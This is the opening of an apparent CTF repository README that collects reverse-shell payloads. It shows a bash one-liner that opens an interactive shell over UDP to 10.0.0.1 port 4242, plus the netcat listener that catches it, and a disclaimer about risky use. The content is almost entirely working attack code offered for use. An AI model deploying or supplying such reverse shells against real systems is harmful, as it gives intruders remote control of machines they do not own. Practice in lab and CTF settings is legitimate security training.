# reverse-shell-payloads
This repository contains all of the payloads I've used in my CTFs, some of this are not working in latest Operating Systems but in CTF situations, they do the work. Just don't ever use this for something fishy. Please use this payloads at your own risk.

## BASH

- UDP
  ```bash
  sh -i >& /dev/udp/10.0.0.1/4242 0>&0
  ```
  ```
  Listener: nc -u -lvp 4242
  ```
